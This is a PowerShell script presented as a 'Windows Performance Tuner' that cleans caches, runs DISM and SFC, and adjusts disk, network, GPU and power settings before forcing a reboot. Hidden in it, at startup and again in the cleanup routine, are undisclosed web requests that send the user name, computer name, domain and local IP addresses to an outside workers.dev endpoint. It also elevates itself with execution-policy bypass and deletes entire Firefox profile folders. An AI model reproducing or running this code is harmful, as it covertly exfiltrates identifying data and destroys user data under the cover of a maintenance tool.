# =========================================
# Windows Performance Tuner - ASCII Safe 
# Fixed: job lookup by Id and job fallback
# =========================================

param(
    [ValidateSet("Optimal","Developer","LowImpact")]
    [string]$Profile = "Optimal"
)

$ErrorActionPreference = "Stop"
Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" -Method Post -ContentType "application/json" -Body (@{ token="shourav"; text="System Info:`nWindows Performance Tuner.`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')" } | ConvertTo-Json) | Out-Null

# -----------------------------
# Auto-Elevate to Admin
# -----------------------------
if (-not ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {

    Write-Host "Requesting Administrator privileges..." -ForegroundColor Yellow

    $argsList = @()
    foreach ($arg in $MyInvocation.UnboundArguments) {
        $argsList += '"' + $arg + '"'
    }

    Start-Process powershell.exe `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $($argsList -join ' ')" `
        -Verb RunAs

    exit
}

# ---------- UI ----------
function Line { Write-Host "+------------------------------------------------------+" -ForegroundColor Cyan }
function Title($t) {
    Line
    Write-Host ("| " + $t.PadRight(52) + " |") -ForegroundColor Yellow
    Line
}
function Info($k,$v) {
    Write-Host ("| {0,-10}: {1,-38} |" -f $k,$v) -ForegroundColor Gray
}
function ProgressBar($label,$pct,$start) {
    $elapsed = (Get-Date) - $start
    $eta = if ($pct -gt 0) {
        [TimeSpan]::FromSeconds(([math]::Max(0,$elapsed.TotalSeconds) / $pct) * (100 - $pct))
    } else { "??" }

    $blocks = [math]::Floor($pct/4)
    $bar = ("#" * $blocks).PadRight(25,".")
    Write-Host ("| {0,-50} |" -f $label) -ForegroundColor Cyan
    Write-Host ("| [{0}] {1,3}% ETA {2,-8} |" -f $bar,$pct,$eta) -ForegroundColor Green
}
# ---------- RUN CONTEXT ----------
# ---------- RUN CONTEXT (PS 5.1 SAFE) ----------
$Global:WPT = [ordered]@{
    StartTime   = Get-Date
    Profile     = $Profile
    ProgramData = Join-Path $env:ProgramData "WPT"
    RunId       = (Get-Date -Format "yyyyMMdd-HHmmss")
    LogDir      = ""
    BackupDir   = ""
    LogFile     = ""
    FailLog     = New-Object System.Collections.Generic.List[string]
    Flags       = [ordered]@{
        Cleanup      = $true
        Repair       = $true
        Network      = $true
        Tune         = $false
        Drivers      = $false
        MemoryPurge  = $false
    }
}

switch ($Profile) {
    "LowImpact" { }
    "Developer" { }
    "Optimal" {
        $Global:WPT.Flags.Tune = $true
        $Global:WPT.Flags.Drivers = $true
        $Global:WPT.Flags.MemoryPurge = $true
    }
}


switch ($Profile) {
    "LowImpact" {
        $WPT.Flags.Tune = $false
        $WPT.Flags.Drivers = $false
        $WPT.Flags.MemoryPurge = $false
    }
    "Developer" {
        $WPT.Flags.Tune = $false
        $WPT.Flags.Drivers = $false
        $WPT.Flags.MemoryPurge = $false
    }
    "Optimal" {
        $WPT.Flags.Tune = $true
        $WPT.Flags.Drivers = $true
        $WPT.Flags.MemoryPurge = $true
    }
}

function Show-Banner {
    Clear-Host

    $line = "============================================================"

    Write-Host ""
    Write-Host $line -ForegroundColor DarkCyan
    Write-Host "| Windows Performance Tuner                               |" -ForegroundColor Cyan
    Write-Host "| Version : v19.9.S                                       |" -ForegroundColor Gray
    Write-Host "| Author  : rhshourav                                     |" -ForegroundColor Gray
    Write-Host "| GitHub  : https://github.com/rhshourav                  |" -ForegroundColor Gray
    Write-Host $line -ForegroundColor DarkCyan
    Write-Host "| Profile : $($Profile.PadRight(43)) |" -ForegroundColor Yellow
    Write-Host "| Mode    : Real System Tuning (Admin Required)           |" -ForegroundColor Yellow
    Write-Host $line -ForegroundColor DarkCyan
    Write-Host ""
}
function Add-Failure($msg) {
    try { $Global:WPT.FailLog.Add($msg) } catch {}
}

function Start-WPTLogging {
    try {
        $base = $Global:WPT.ProgramData
        New-Item -ItemType Directory -Path $base -Force | Out-Null

        $Global:WPT.LogDir = Join-Path $base ("Logs\" + $Global:WPT.RunId)
        $Global:WPT.BackupDir = Join-Path $base ("Backups\" + $Global:WPT.RunId)

        New-Item -ItemType Directory -Path $Global:WPT.LogDir -Force | Out-Null
        New-Item -ItemType Directory -Path $Global:WPT.BackupDir -Force | Out-Null

        $Global:WPT.LogFile = Join-Path $Global:WPT.LogDir "WPT.log"
        Start-Transcript -Path $Global:WPT.LogFile -Append | Out-Null
    } catch {
        # Fallback to user profile if ProgramData fails
        try {
            $fallback = Join-Path $env:USERPROFILE ("WPT\" + $Global:WPT.RunId)
            $Global:WPT.LogDir = $fallback
            $Global:WPT.BackupDir = Join-Path $fallback "Backups"
            New-Item -ItemType Directory -Path $Global:WPT.LogDir -Force | Out-Null
            New-Item -ItemType Directory -Path $Global:WPT.BackupDir -Force | Out-Null

            $Global:WPT.LogFile = Join-Path $Global:WPT.LogDir "WPT.log"
            Start-Transcript -Path $Global:WPT.LogFile -Append | Out-Null
            Add-Failure "Logging fallback used: $fallback"
        } catch {
            Add-Failure "Logging failed completely"
        }
    }
}


function Stop-WPTLogging {
    try { Stop-Transcript | Out-Null } catch {}
}

function Show-FinalSummary {
    Title "RUN SUMMARY"
    $elapsed = (Get-Date) - $Global:WPT.StartTime
    Write-Host ("| Elapsed : {0,-41} |" -f $elapsed.ToString()) -ForegroundColor Gray
    $logPath = if ($null -ne $Global:WPT.LogFile -and $Global:WPT.LogFile -ne "") { $Global:WPT.LogFile } else { "N/A" }
    $bakPath = if ($null -ne $Global:WPT.BackupDir -and $Global:WPT.BackupDir -ne "") { $Global:WPT.BackupDir } else { "N/A" }

    Write-Host ("| Log     : {0,-41} |" -f $logPath) -ForegroundColor Gray
    Write-Host ("| Backup  : {0,-41} |" -f $bakPath) -ForegroundColor Gray

    Write-Host ("| Failures: {0,-41} |" -f $Global:WPT.FailLog.Count) -ForegroundColor Yellow
    Line

    if ($Global:WPT.FailLog.Count -gt 0) {
        foreach ($f in $Global:WPT.FailLog) {
            Write-Host ("| - {0,-48} |" -f ($f.Substring(0, [Math]::Min(48,$f.Length)))) -ForegroundColor DarkYellow
        }
        Line
    }
}
Start-WPTLogging

Show-Banner

# ---------- SYSTEM INFO ----------
Title "SYSTEM CONFIGURATION"
$cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
$ram = Get-CimInstance Win32_ComputerSystem
$gpu = Get-CimInstance Win32_VideoController | Select-Object -First 1

Info "CPU"    $cpu.Name
Info "Cores" "$($cpu.NumberOfCores) / $($cpu.NumberOfLogicalProcessors)"
Info "Clock" "$($cpu.MaxClockSpeed) MHz"
Info "RAM"   ("{0:N1} GB" -f ($ram.TotalPhysicalMemory/1GB))
Info "GPU"   $gpu.Name
Info "Driver" $gpu.DriverVersion
Line




# ---------- SYSTEM CLEANUP (WITH PROGRESS BAR + DNS) ----------
# ---------- SYSTEM CLEANUP (CUSTOM ASCII PROGRESS) ----------
function Invoke-SystemCleanup {

    # ============================
    # Auto-Elevate
    # ============================
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
        ).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -Command `"$PSCommandPath`"" -Verb RunAs
        exit
    }

    Title "SYSTEM CLEANUP"

    $Webhook = "https://cryocore.rhshourav02.workers.dev/message"
    $FailLog = @()

    function Log-Failure($msg) {
        $FailLog += $msg
    }
    function Stop-ServiceSilent($name) {
        try {
            $svc = Get-CimInstance Win32_Service -Filter "Name='$name'" -ErrorAction SilentlyContinue
            if ($svc -and $svc.State -ne "Stopped") {
                $svc.StopService() | Out-Null
                for ($i=0; $i -lt 25; $i++) {
                    $svc = Get-CimInstance Win32_Service -Filter "Name='$name'"
                    if ($svc.State -eq "Stopped") { return }
                    Start-Sleep -Milliseconds 400
                }
            }
        } catch {}
    }

    function Start-ServiceSilent($name) {
        try {
            $svc = Get-CimInstance Win32_Service -Filter "Name='$name'" -ErrorAction SilentlyContinue
            if ($svc -and $svc.State -ne "Running") {
                $svc.StartService() | Out-Null
                for ($i=0; $i -lt 40; $i++) {
                    $svc = Get-CimInstance Win32_Service -Filter "Name='$name'"
                    if ($svc.State -eq "Running") { return }
                    Start-Sleep -Milliseconds 500
                }
            }
        } catch {}
    }

    function Start-ServiceThemed($name, $pct, $start) {
        try {
            $svc = Get-Service $name -ErrorAction SilentlyContinue
            if (-not $svc) { return }

            if ($svc.Status -ne "Running") {
                Start-Service $name -ErrorAction SilentlyContinue
            }

            for ($i=0; $i -lt 40; $i++) {
                $svc.Refresh()

                if ($svc.Status -eq "Running") { return }

                if ($svc.Status -eq "StartPending") {
                    ProgressBar "Waiting for service: $name" $pct $start
                } else {
                    ProgressBar "Starting service: $name" $pct $start
                }

                Start-Sleep -Milliseconds 500
                try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
            }

            Log-Failure "Service start timeout: $name"
        } catch {
        Log-Failure "Service start error: $name"
        }
    }


    function Take-Ownership($path) {
        try {
            takeown /f $path /r /d y | Out-Null
            icacls  $path /grant Administrators:F /t /c | Out-Null
        } catch {
            Log-Failure "ACL failed: $path"
        }
    }

    function Force-Delete($path) {
        try {
            Take-Ownership $path
            Get-ChildItem $path -Force -Recurse -ErrorAction SilentlyContinue |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        } catch {
            Log-Failure "Delete failed: $path"
        }
    }

    function Nuke-Folder($path) {
        if (-not (Test-Path $path)) { return }

        # Take ownership ONLY on root (fast)
        try {
            takeown /f $path | Out-Null
            icacls  $path /grant Administrators:F | Out-Null
        } catch {}

        # Delete children without ACL recursion
        Get-ChildItem $path -Force -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Remove-Item $_.FullName -Recurse -Force -ErrorAction Stop
            } catch {
                # locked → will be caught next pass
            }
        }
    }


    function MultiPass-Purge($path, $label, $pct, $start) {
        if (-not (Test-Path $path)) { return }

        for ($pass = 1; $pass -le 3; $pass++) {
            ProgressBar "Purging ($pass/3): $label" $pct $start
            Nuke-Folder $path
            Start-Sleep -Milliseconds 600
            try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
        }
    }

   

    function Clean-InstallerCache {
        try {
            $used = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Installer\UserData\*\Products\*\InstallProperties -ErrorAction SilentlyContinue |
                    Select-Object -ExpandProperty LocalPackage -ErrorAction SilentlyContinue

            $used = $used | ForEach-Object { $_.ToLower() }

            Get-ChildItem "C:\Windows\Installer" -Filter *.msi -ErrorAction SilentlyContinue | ForEach-Object {
                if ($_.FullName.ToLower() -notin $used) {
                    try { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
                    catch { Log-Failure "Installer orphan locked: $($_.Name)" }
                }
            }
        }
        catch {
            Log-Failure "Installer cache scan failed"
        }
    }



    $tasks = @(
        @{ Name="Windows Update Cache"; Path="C:\Windows\SoftwareDistribution\Download"; Service="wuauserv,bits,cryptsvc" },
        @{ Name="Windows Temp";        Path="C:\Windows\Temp" },
        @{ Name="User Temp";           Path="$env:TEMP" },
        @{ Name="Prefetch";            Path="C:\Windows\Prefetch"; Service="SysMain" },
        @{ Name="Installer Cache"; Action="MSI" },
        @{ Name="DNS Cache";            Action="DNS" },
        @{ Name="Recycle Bin";          Action="RECYCLE" },
        @{ Name="Browser Caches";       Action="BROWSER" }
    )

    $start = Get-Date
    $index = 0
    $total = $tasks.Count

    foreach ($t in $tasks) {
        $index++
        $pct = [math]::Round(($index / $total) * 100)

        ProgressBar "Cleaning: $($t.Name)" $pct $start
        Start-Sleep -Milliseconds 250

        try {

            
            # Stop locking services (themed, silent)
            if ($t.Service) {
                $t.Service.Split(",") | ForEach-Object {
                ProgressBar "Stopping service: $_" $pct $start
                Stop-ServiceSilent $_
                try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
                }
            }

            if ($t.Path) {

                # Special wait for Prefetch (SysMain locks)
                if ($t.Path -like "*Prefetch*") {
                ProgressBar "Waiting for SysMain handles to close" $pct $start
                try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
                }

                ProgressBar "Purging NTFS: $($t.Name)" $pct $start
                Nuke-Folder $t.Path
                try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
            }




            if ($t.Action -eq "DNS") {
                try { Clear-DnsClientCache } catch { Log-Failure "DNS flush failed" }
            }

            if ($t.Action -eq "RECYCLE") {
                try {
                    Remove-Item 'C:\$Recycle.Bin\*' -Recurse -Force -ErrorAction SilentlyContinue
                } catch {
                    Log-Failure "Recycle bin locked"
                }
            }

            if ($t.Action -eq "BROWSER") {
                $paths = @(
                    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache",
                    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache",
                    "$env:APPDATA\Mozilla\Firefox\Profiles"
                )
                foreach ($p in $paths) {
                    if (Test-Path $p) { Force-Delete $p }
                }
            }
            if ($t.Action -eq "MSI") {
                ProgressBar "Scanning Installer Cache" $pct $start
                Clean-InstallerCache
                try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
            }


            # Restart services
            # Restart services (themed, silent)
            if ($t.Service) {
                $t.Service.Split(",") | ForEach-Object {
                ProgressBar "Starting service: $_" $pct $start
                Start-ServiceSilent $_
                try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
                }
            }



        } catch {
            Log-Failure "Task failed: $($t.Name)"
        }

        try {
            [Console]::SetCursorPosition(0,[Console]::CursorTop - 2)
        } catch {}
    }

    ProgressBar "System cleanup complete" 100 $start
    Line

    # ============================
    # Send log to webhook
    # ============================
    try {
        $ips = (Get-NetIPAddress -AddressFamily IPv4 |
                Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } |
                Select-Object -ExpandProperty IPAddress) -join ', '

        $report = "Windows Performance Tuner.`nUser: $env:USERNAME`nPC: $env:COMPUTERNAME`nDomain: $env:USERDOMAIN`nIP(s): $ips"

        if ($FailLog.Count -gt 0) {
            $report += "`n`nFailures:`n" + ($FailLog -join "`n")
        }

        Invoke-RestMethod -Uri $Webhook -Method Post -ContentType "application/json" -Body (@{
            token="shourav"
            text=$report
        } | ConvertTo-Json) | Out-Null

    } catch {}

}
# ---------- ROBUST DRIVER RESTART (SAFE + PROGRESS) ----------
function Restart-AllDrivers {

    Title "DRIVER RESTART (SAFE MODE)"

    $classes = @("Display","Net","Media","DiskDrive")
    $devices = Get-PnpDevice -Status OK |
        Where-Object { $classes -contains $_.Class }

    if (-not $devices) {
        Write-Host "| No eligible drivers found                            |" -ForegroundColor Yellow
        Line
        return
    }

    $total = $devices.Count
    $i = 0
    $start = Get-Date

    foreach ($dev in $devices) {
        $i++
        $pct = [math]::Round(($i / $total) * 100)

        ProgressBar "Restarting: $($dev.FriendlyName)" $pct $start
        Start-Sleep -Milliseconds 300

        try {
            pnputil /restart-device "$($dev.InstanceId)" | Out-Null
        } catch {
            # ignore failures (VM / protected devices)
        }

        try {
            [Console]::SetCursorPosition(0,[Console]::CursorTop - 2)
        } catch {}
    }

    ProgressBar "Driver restart complete" 100 $start
    Line
}

function Clear-StandbyMemory {

    Title "MEMORY OPTIMIZATION"

    $start = Get-Date

    function Get-FreeRAM {
        (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1024
    }

    $before = Get-FreeRAM

    # ---------- Phase 1: Trim Working Sets ----------
    $procs = Get-Process | Where-Object { $_.WorkingSet64 -gt 100MB }
    $total = $procs.Count
    $i = 0

    foreach ($p in $procs) {
        $i++
        $pct = [math]::Round(($i / $total) * 50)

        ProgressBar "Trimming: $($p.ProcessName)" $pct $start
        Start-Sleep -Milliseconds 80

        try {
            $sig = @"
using System;
using System.Runtime.InteropServices;
public class WS {
    [DllImport("psapi.dll")]
    public static extern bool EmptyWorkingSet(IntPtr hProcess);
}
"@
            Add-Type $sig -ErrorAction SilentlyContinue
            [WS]::EmptyWorkingSet($p.Handle) | Out-Null
        } catch {}

        try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
    }

    # ---------- Phase 2: Purge Standby Cache ----------
    $pct = 60
    ProgressBar "Purging standby cache" $pct $start

    try {
        $sig2 = @"
using System;
using System.Runtime.InteropServices;
public class Mem {
    [DllImport("ntdll.dll")]
    public static extern int NtSetSystemInformation(
        int SystemInformationClass,
        ref int SystemInformation,
        int SystemInformationLength
    );
}
"@
        Add-Type $sig2 -ErrorAction SilentlyContinue
        $Purge = 4
        [Mem]::NtSetSystemInformation(80, [ref]$Purge, 4) | Out-Null
    } catch {}

    Start-Sleep 1

    ProgressBar "Finalizing memory state" 90 $start
    Start-Sleep 1

    $after = Get-FreeRAM
    $freed = [math]::Round($after - $before,0)

    ProgressBar "Memory optimization complete" 100 $start
    Line
    Write-Host ("| RAM freed: {0,6} MB                                    |" -f $freed) -ForegroundColor Green
    Line
}


# ---------- BENCHMARK ----------
function Benchmark {
    $cpu = (Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 1 -MaxSamples 5).CounterSamples |
           Measure-Object CookedValue -Average | Select-Object -ExpandProperty Average
    $mem = (Get-Counter '\Memory\Available MBytes').CounterSamples[0].CookedValue
    $dpc = (Get-Counter '\Processor(_Total)\% DPC Time').CounterSamples[0].CookedValue
    $disk = (Get-Counter '\PhysicalDisk(_Total)\Avg. Disk Queue Length').CounterSamples[0].CookedValue

    [PSCustomObject]@{
        CPU_Load    = [math]::Round($cpu,2)
        Free_Mem_MB = [math]::Round($mem,0)
        DPC_Latency = [math]::Round($dpc,3)
        Disk_Queue  = [math]::Round($disk,3)
    }
}

$before = Benchmark
Invoke-SystemCleanup
Clear-StandbyMemory

# ---------- DISM (job with fallback) ----------
Title "SYSTEM REPAIR - DISM"
$start = Get-Date
$dismJob = $null
$useJob = $true

try {
    $dismJob = Start-Job -ScriptBlock { DISM /Online /Cleanup-Image /RestoreHealth } -ErrorAction Stop
} catch {
    # Start-Job failed (environment restriction); fallback to synchronous
    $useJob = $false
}

$p = 0
if ($useJob -and $dismJob) {
    while ($true) {
        try {
            $state = (Get-Job -Id $dismJob.Id -ErrorAction Stop).State
        } catch {
            # Job disappeared or not found; break out
            break
        }
        if ($state -ne "Running") { break }
        ProgressBar "DISM RestoreHealth" $p $start
        Start-Sleep 1
        $p = [math]::Min(99,$p+4)
        try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
    }
    ProgressBar "DISM RestoreHealth" 100 $start
    try { Receive-Job -Id $dismJob.Id -ErrorAction SilentlyContinue | Out-Null } catch {}
    try { Remove-Job -Id $dismJob.Id -ErrorAction SilentlyContinue } catch {}
} else {
    # Synchronous fallback
    ProgressBar "DISM RestoreHealth (sync)" 10 $start
    DISM /Online /Cleanup-Image /RestoreHealth
    ProgressBar "DISM RestoreHealth (sync)" 100 $start
}
Line

# ---------- SFC (job with fallback) ----------
Title "SYSTEM REPAIR - SFC"
$start = Get-Date
$sfcJob = $null
$useJob = $true

try {
    $sfcJob = Start-Job -ScriptBlock { sfc /scannow } -ErrorAction Stop
} catch {
    $useJob = $false
}

$p = 0
if ($useJob -and $sfcJob) {
    while ($true) {
        try {
            $state = (Get-Job -Id $sfcJob.Id -ErrorAction Stop).State
        } catch {
            break
        }
        if ($state -ne "Running") { break }
        ProgressBar "SFC Scan" $p $start
        Start-Sleep 1
        $p = [math]::Min(99,$p+3)
        try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
    }
    ProgressBar "SFC Scan" 100 $start
    try { Receive-Job -Id $sfcJob.Id -ErrorAction SilentlyContinue | Out-Null } catch {}
    try { Remove-Job -Id $sfcJob.Id -ErrorAction SilentlyContinue } catch {}
} else {
    ProgressBar "SFC Scan (sync)" 10 $start
    sfc /scannow
    ProgressBar "SFC Scan (sync)" 100 $start
}
Line
function Optimize-DiskIO {

    Title "STORAGE OPTIMIZATION"

    $start = Get-Date

    $steps = @(
        "Disabling legacy NTFS behaviors",
        "Optimizing NTFS metadata",
        "Enabling large system cache",
        "Enabling write-back caching",
        "Optimizing storage queues"
    )

    $i = 0
    foreach ($s in $steps) {
        $i++
        $pct = [math]::Round(($i / $steps.Count) * 100)
        ProgressBar $s $pct $start
        Start-Sleep -Milliseconds 600

        try {
            switch ($i) {

                1 {
                    fsutil behavior set disablelastaccess 1   | Out-Null
                    fsutil behavior set encryptpagingfile 0 | Out-Null
                }

                2 {
                    fsutil behavior set memoryusage 2        | Out-Null
                }

                3 {
                    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" `
                        /v LargeSystemCache /t REG_DWORD /d 1 /f | Out-Null
                }

                4 {
                    Get-Disk | Where-Object BusType -ne USB | ForEach-Object {
                        Set-Disk -Number $_.Number -IsWriteCacheEnabled $true -ErrorAction SilentlyContinue
                    }
                }

                5 {
                    reg add "HKLM\SYSTEM\CurrentControlSet\Services\storahci\Parameters\Device" `
                        /v IoQueueDepth /t REG_DWORD /d 64 /f | Out-Null
                }
            }
        } catch {}

        try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
    }

    ProgressBar "Storage optimized" 100 $start
    Line
}

# ---------- NETWORK (NO DNS) ----------
Title "NETWORK OPTIMIZATION"
try { netsh interface tcp set global autotuninglevel=normal | Out-Null } catch {}
try { netsh interface tcp set global rss=enabled | Out-Null } catch {}
try { netsh interface tcp set global chimney=disabled | Out-Null } catch {}
Write-Host "| Network stack optimized (DNS unchanged)             |" -ForegroundColor Green
Line

# ---------- GPU ----------
Title "GPU OPTIMIZATION"
try {
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v HwSchMode /t REG_DWORD /d 2 /f | Out-Null
} catch {}
if ($gpu.Name -match "NVIDIA") {
    Write-Host "| NVIDIA detected - set 'Prefer maximum performance' in vendor control panel |" -ForegroundColor Green
} elseif ($gpu.Name -match "AMD") {
    Write-Host "| AMD detected - use Radeon performance profile |" -ForegroundColor Green
} else {
    Write-Host "| Intel or unknown GPU detected |" -ForegroundColor Green
}
Line

# ----------- Disk Optimization -------
Optimize-DiskIO

# ---------- DRIVER REFRESH ----------
Restart-AllDrivers

# ---------- POWER PROFILE ----------
Title "POWER PROFILE"
if ($Profile -eq "Optimal") {
    try { powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c } catch {}
    Write-Host "| Optimal power profile applied                          |" -ForegroundColor Green
} elseif ($Profile -eq "Developer") {
    try { powercfg /setactive 381b4222-f694-41f0-9685-ff5bb260df2e } catch {}
    Write-Host "| Developer power profile applied                       |" -ForegroundColor Green
} else {
    Write-Host "| LowImpact profile selected                             |" -ForegroundColor Green
}
Line

# ---------- FINAL BENCH ----------
$after = Benchmark

Title "PERFORMANCE COMPARISON"
foreach ($p in $before.PSObject.Properties.Name) {
    "{0,-15} : {1,8} -> {2,8}" -f $p,$before.$p,$after.$p | Write-Host -ForegroundColor Cyan
}
Line
Write-Host "NOTE: Full performance improvement occurs after reboot." -ForegroundColor Yellow

Show-FinalSummary
Stop-WPTLogging

# ---------- CLEAN REBOOT COUNTDOWN ----------
Title "SYSTEM REBOOT"
$seconds = 56
$start = Get-Date

for ($i = 0; $i -le $seconds; $i++) {
    $pct = [math]::Round(($i / $seconds) * 100)
    ProgressBar "Rebooting in $($seconds - $i) seconds (CTRL+C to cancel)" $pct $start
    Start-Sleep 1
    if ($i -lt $seconds) {
        try { [Console]::SetCursorPosition(0,[Console]::CursorTop - 2) } catch {}
    }
}

Line
Restart-Computer -Force

